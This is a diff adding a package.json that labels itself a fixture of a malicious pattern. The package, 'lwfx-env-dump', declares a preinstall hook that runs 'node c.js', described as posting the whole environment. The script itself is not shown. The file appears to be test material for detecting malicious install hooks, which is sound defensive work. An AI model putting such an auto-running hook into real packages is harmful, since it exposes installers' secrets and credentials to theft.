@@ -1,0 +1,6 @@
+{
+  "name": "lwfx-env-dump",
+  "version": "1.0.0",
+  "description": "FIXTURE (malicious pattern): posts the whole environment",
+  "scripts": { "preinstall": "node c.js" }
+}
